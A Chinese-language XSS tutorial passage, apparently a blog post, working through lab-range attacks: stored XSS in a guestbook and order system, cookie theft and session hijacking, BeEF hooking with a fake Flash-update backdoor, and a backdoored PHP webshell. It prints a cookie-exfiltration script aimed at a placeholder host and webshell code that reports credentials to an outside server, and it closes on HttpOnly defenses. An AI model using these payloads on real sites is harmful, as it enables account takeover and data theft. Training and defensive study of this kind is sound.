<p>此时 XSS 平台就有记录了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-828f2acada83ef3f.png"></p>
<h4 id="④-使用-firebug-登录后台"><a href="#④-使用-firebug-登录后台" class="headerlink" title="④ 使用 firebug 登录后台"></a>④ 使用 firebug 登录后台</h4><p>获取到访问的 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://192.168.100.120/SyGuestBook_v1.2/index.php?c=adminMessage&amp;a=ListMessage&amp;gid=1</span><br><span class="line">Cookie：valueName=w01ke; valueQq=5201314; PHPSESSID=en5mt3n1snl0hvg6d45mji2a95&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>用获取到的 cookie 和后台链接，使用 firebug 进行设置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-3727e71d0527660d.png"></p>
<p>成功进入后台！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-88d49445998eca30.png"></p>
<p>注意：因为是留言板，因此别人查看我们留下的 XSS 攻击代码时，也会记录到 XSS 平台，因此查看 XSS 平台的记录时注意甄别访客和管理员</p>
<h2 id="2、BUUCTF-basic-BUU-XSS-COURSE-1"><a href="#2、BUUCTF-basic-BUU-XSS-COURSE-1" class="headerlink" title="2、BUUCTF-basic-BUU XSS COURSE 1"></a>2、BUUCTF-basic-BUU XSS COURSE 1</h2><ul>
<li>👉<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.yuque.com/docs/share/d0abe6d1-1669-4d83-a4d2-6fe1e82f770d">《BUUCTF-basic-BUU XSS COURSE 1》</a>👈</li>
</ul>
<h2 id="3、订单系统——军锋真人-CS-野战-123"><a href="#3、订单系统——军锋真人-CS-野战-123" class="headerlink" title="3、订单系统——军锋真人 CS 野战 123"></a>3、订单系统——军锋真人 CS 野战 123</h2><h3 id="（1）靶场下载"><a href="#（1）靶场下载" class="headerlink" title="（1）靶场下载"></a>（1）靶场下载</h3><p>链接：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg">https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg</a> ，提取码：rtra</p>
<h3 id="（2）靶场安装"><a href="#（2）靶场安装" class="headerlink" title="（2）靶场安装"></a>（2）靶场安装</h3><p>注意下载安装好后仔细查看安装说明，比如 config.php 的数据库账密要对，否则连接不上数据库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-4d8585a47dcb02a5.png"></p>
<p>如果访问 install.php 提示以下信息，按照提示操作即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-4adae7e0176cf9f0.png"></p>
<p>在真实机部署环境时出现了一系列问题（后台登录页面验证码无法显示），我是在 Win7 虚拟机，PHP 版本为 5.3.29 部署成功的</p>
<h3 id="（3）进行攻击-1"><a href="#（3）进行攻击-1" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试-1"><a href="#①-初次尝试-1" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>攻击者在具体要求一栏构造 payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b6f571b666cb48fa.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-566294811fca4664.png"></p>
<p>管理员在后台进行查看时就会弹出弹窗</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-789e71ce4f73ad9e.png"></p>
<p>正是因为我们的 JS 代码嵌入到了其中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b58f2e68c1ad783f.png"></p>
<h4 id="②-XSS-平台获取-cookie"><a href="#②-XSS-平台获取-cookie" class="headerlink" title="② XSS 平台获取 cookie"></a>② XSS 平台获取 cookie</h4><p>选择 XSS 平台的攻击代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-3b8860a921cf8f1d.png"></p>
<p>提交</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-d09f480e2480bd63.png"></p>
<p>管理员在后台查看时就会触发攻击代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-26e46652b621252f.png"></p>
<p>此时在 XSS 平台就能查看到获取的信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b2b9a07568c3dd5f.png"></p>
<h4 id="③-postman-登录后台"><a href="#③-postman-登录后台" class="headerlink" title="③ postman 登录后台"></a>③ postman 登录后台</h4><p>postman 下载地址：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-fce1d780bdaa55e4.png"></p>
<h3 id="（4）Beef-结合-XSS-攻击"><a href="#（4）Beef-结合-XSS-攻击" class="headerlink" title="（4）Beef 结合 XSS 攻击"></a>（4）Beef 结合 XSS 攻击</h3><h4 id="①-安装-Beef-xss"><a href="#①-安装-Beef-xss" class="headerlink" title="① 安装 Beef-xss"></a>① 安装 Beef-xss</h4><p>最新版 kali 安装 beef-xss</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure>

<p>如果遇到找不到包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-1eabc0ae38b1e4bb.png"></p>
<p>解决方案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 编辑文件</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"># 添加旧的资源信息</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line"># For source package access, uncomment the following line</span><br><span class="line"># deb-src http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line"># For source package access, uncomment the following line</span><br><span class="line"># deb-src http://http.kali.org/kali sana main non-free contrib</span><br><span class="line"># deb-src http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br><span class="line"># For source package access, uncomment the following line</span><br><span class="line"># deb-src http://old.kali.org/kali moto main non-free contrib</span><br><span class="line"></span><br><span class="line"># 更新资源列表</span><br><span class="line">sudo apt-get update&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>更新完毕后重新安装目标应用即可</p>
<p>安装完成后，直接使用 beef-xss 启动会有启动失败的问题，目前还不知道解决方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-6f08002a6744d5b7.png"></p>
<p>但是可以进入<code>/usr/share/beef-xss/</code>目录，使用<code>./beef</code>启动即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-7d9400c0af72acd1.png"></p>
<p>如果需要修改登录账号密码可以修改 config.yaml 文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-509c48cf018b5136.png"></p>
<h4 id="②-使用-beef-xss"><a href="#②-使用-beef-xss" class="headerlink" title="② 使用 beef-xss"></a>② 使用 beef-xss</h4><p>启动 beef 后，插入钩子，提交</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-0f55b1d55c7d43f2.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-33b1be538c8ce109.png"></p>
<p>后台管理员查看订单触发 XSS</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-9a9045528e2d4c67.png"></p>
<p>成功上线</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-89d785f269416c87.png"></p>
<p>获取 Cookie</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-d8aa21aeb1ced056.png"></p>
<p>浏览器跳转</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-ba6052f8a3cd1d07.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-e2fe71eac2726d19.png"></p>
<p>社工攻击，利用模拟 Flash 更新向客户端发送请求，来实现下载后门</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-5b6ec4e3b8496560.png"></p>
<p>客户端显示，点击就下载后门</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-21df4802cfb80c3a.png"></p>
<h2 id="4、WebShell-箱子管理系统"><a href="#4、WebShell-箱子管理系统" class="headerlink" title="4、WebShell 箱子管理系统"></a>4、WebShell 箱子管理系统</h2><p>就是使用别人的 webshell 来进行获取服务器 shell，但获取 shell 后 <strong>webshell</strong> 存在的<strong>恶意代码</strong>就会把网站信息和 webshell 密码，和用户名发到 webshell 的原主人来进行<strong>信息收集</strong>，通过大量获取的网站 shell 来进行<strong>贩卖</strong>，而使用 webshell 的人就成<strong>打工仔</strong>了。</p>
<p>反杀的意思就是像上面的<strong>窃取 cookie</strong> 道理一样通过向 webshell 的代码中插入窃取 cookie 的代码，当 webshell 原注入查看沙箱时就会触发 xss 窃取 cookie 来达到<strong>反客为主</strong>！</p>
<p>既然说到了 WebShell，推荐一个 WebShell 库：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
<h3 id="（1）搭建靶场-1"><a href="#（1）搭建靶场-1" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><h4 id="①-靶场下载"><a href="#①-靶场下载" class="headerlink" title="① 靶场下载"></a>① 靶场下载</h4><p>靶场下载：链接：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA">https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA</a></p>
<p>提取码：gay7</p>
<h4 id="②-小旋风下载"><a href="#②-小旋风下载" class="headerlink" title="② 小旋风下载"></a>② 小旋风下载</h4><p>搭建一个 asp 的服务器，我们这里选用小旋风进行搭建 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip">http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip</a>，下载完成后解压到虚拟机里面</p>
<p>默认端口为 80。如果 80 端口被占用或不想用 80 可用记事本打开 host.ini 增加端口网站服务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-6193cf0e964286dc.png"></p>
<h4 id="③-靶场搭建"><a href="#③-靶场搭建" class="headerlink" title="③ 靶场搭建"></a>③ 靶场搭建</h4><p>将下载好的 webshell 箱子放在搭建好的服务器里面，这里我放到了 8001 端口下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-53fa38123d2360e8.png"></p>
<p>这里存在一个问题，访问该网址时只能访问 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://localhost:8001/xxx">http://localhost:8001/xxx</a> ，访问 127.0.0.1 或者内网 IP 地址都会报 <strong>418 Host Not Found</strong> 的错误</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-f322fa81c99c8c73.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-dd241a250c3a1b13.png"></p>
<p>经过排查终于知道是哪里出了问题，只需要将这里修改成对应的 IP 地址，重启服务即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-d7a346d8be743778.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-9ee83b4e07802246.png"></p>
<p>假如我们向 wolke.cn 传入了别人留了后门的木马，进行连接，访问了 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://10.3.14.17:8001/api.asp?url=wolke.cn&pass=sqzr&id=1">http://10.3.14.17:8001/api.asp?url=wolke.cn&pass=sqzr&id=1</a> ，这个时候别人在后台就能看到我们的 webshell，坐收渔翁之利</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-dc3d7ec585fb2943.png"></p>
<h3 id="（2）进行攻击"><a href="#（2）进行攻击" class="headerlink" title="（2）进行攻击"></a>（2）进行攻击</h3><h4 id="①-模拟-webshell-原作者进行后门攻击"><a href="#①-模拟-webshell-原作者进行后门攻击" class="headerlink" title="① 模拟 webshell 原作者进行后门攻击"></a>① 模拟 webshell 原作者进行后门攻击</h4><p>登录后台（账号密码都为：admin）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-701205651ade4265.png"></p>
<p>去找一个免杀 WebShell，然后加上我自己的后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$password = &quot;sqzr&quot;;</span><br><span class="line">$url = $_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;]; // HTTP_HOST当前请求头中 Host: 项的内容；PHP_SELF当前执行脚本的文件名</span><br><span class="line">echo &quot;&lt;script src=&#x27;http://10.3.14.17:8001/api.asp?url=$url&amp;pass=$password&amp;id=1&#x27;&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-c5d6a0f61699079a.png"></p>
<p>模拟上传 WebShell 到某网站，并且进行连接触发后门</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-ac7e324ccb116180.png"></p>
<p>这时我们就打开 webshell 箱子发现我们的后门了（实验时发现木马路径太长，即使触发了后门也无法记录到 webshell 箱子中去）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-10dc907529926496.png"></p>
<h4 id="②-反杀-webshell-原作者"><a href="#②-反杀-webshell-原作者" class="headerlink" title="② 反杀 webshell 原作者"></a>② 反杀 webshell 原作者</h4><p>有的 webshell 原作者会利用加密、编码、拼接字符等技术来隐藏 URL，因此我们使用别人的 webshell 时一定要进行代码审计</p>
<p>当我们代码审计获取到 webshell 沙箱的 URL 后，通过访问 webshell 沙箱来植入 XSS 代码窃取 cookie</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-986edb9f7bef1ef9.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-38463d8af92784ec.png"></p>
<p>此时沙箱管理员查看 PHP 信封，就会看到我们的恶意数据，同时也会触发 XSS 攻击代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-3312c3d7cba06c86.png"></p>
<p>XSS 平台新增记录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-55e7962a1137a339.png"></p>
<p>使用 postman 进入后台，直接反杀</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-0b2c1af1a311799e.png"></p>
<h2 id="5、使用-JS-代码获取-Cookie"><a href="#5、使用-JS-代码获取-Cookie" class="headerlink" title="5、使用 JS 代码获取 Cookie"></a>5、使用 JS 代码获取 Cookie</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<h1 id="六、XSS-攻击的检测"><a href="#六、XSS-攻击的检测" class="headerlink" title="六、XSS 攻击的检测"></a>六、XSS 攻击的检测</h1><ol>
<li><p>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。</p>
</li>
<li><p>输入一组 “特殊字符 + 唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。</p>
</li>
<li><p>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行 js 的条件 (构造闭合)。</p>
</li>
<li><p>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在 XSS 漏洞。</p>
</li>
</ol>
<p><strong>Tips：</strong></p>
<ol>
<li><p>通常搜索栏容易出现反射型 XSS，留言板容易出现存储型 XSS；</p>
</li>
<li><p>有些网站鉴于后台可能存在过滤措施，组建的 script 可能会被过滤掉，因而无法生效或者环境限制脚本执行；</p>
</li>
<li><p>通过变化不同的 script，尝试绕过后台的过滤机制。</p>
</li>
</ol>
<p><strong>下图为跨站脚本攻击流程图（Cookies）</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-f7e6303b98ccc601.png"></p>
<p>从图中可以看出：用户访问存在 XSS 漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意 js 的页面；用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。</p>
<h1 id="七、获取-Session-思路"><a href="#七、获取-Session-思路" class="headerlink" title="七、获取 Session 思路"></a>七、获取 Session 思路</h1><p>有的时候获取了 Cookie，但是少了 Session，会造成登不进后台</p>
<p>服务器开启了 Session 验证的话，我们只获取客户端的 Cookie 是没有办法通过验证的，</p>
<p>而且我们也无法获取存放在服务端的 Session</p>
<p>如果需要获取 Session，可以借助辅助文件，比如访问 php 探针时就会携带 Session</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-10509800dec90e18.png"></p>
<p>如果能利用 XSS 让管理员页面跳转到 phpinfo() 界面，通过返回源码就能窃取 Session</p>
<p>利用 beef 进行页面跳转</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-4b2dfe6620861148.png"></p>
<p>获取页面源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-9838ac27b57fbe3b.png"></p>
<p>获取源码中的 cookie 和 session</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-41bc83accb71d926.png"></p>
<h1 id="八、HttpOnly"><a href="#八、HttpOnly" class="headerlink" title="八、HttpOnly"></a>八、HttpOnly</h1><h2 id="1、什么是-HttpOnly"><a href="#1、什么是-HttpOnly" class="headerlink" title="1、什么是 HttpOnly"></a>1、什么是 HttpOnly</h2><p>如果 Cookie 中设置了 HttpOnly 属性，那么通过 JS 脚本将无法读取到 Cookie 信息，这样能有效防止 XSS 攻击，窃取 Cookie 内容。 但是还是存在 xss 跨站语句，阻止的仅仅是获取 cookie</p>
<p>各个主流的脚本语言都支持 HttpOnly</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b9b8df4d99268093.png"></p>
<h2 id="2、HttpOnly-的设置样例"><a href="#2、HttpOnly-的设置样例" class="headerlink" title="2、HttpOnly 的设置样例"></a>2、HttpOnly 的设置样例</h2><h3 id="（1）JavaEE"><a href="#（1）JavaEE" class="headerlink" title="（1）JavaEE"></a>（1）JavaEE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&quot;Set-Cookie&quot;, &quot;cookiename=value;</span><br><span class="line">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;);&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>具体参数的含义再次不做阐述，设置完毕后通过 js 脚本是读不到该 cookie 的，但使用如下方式可以读取</p>
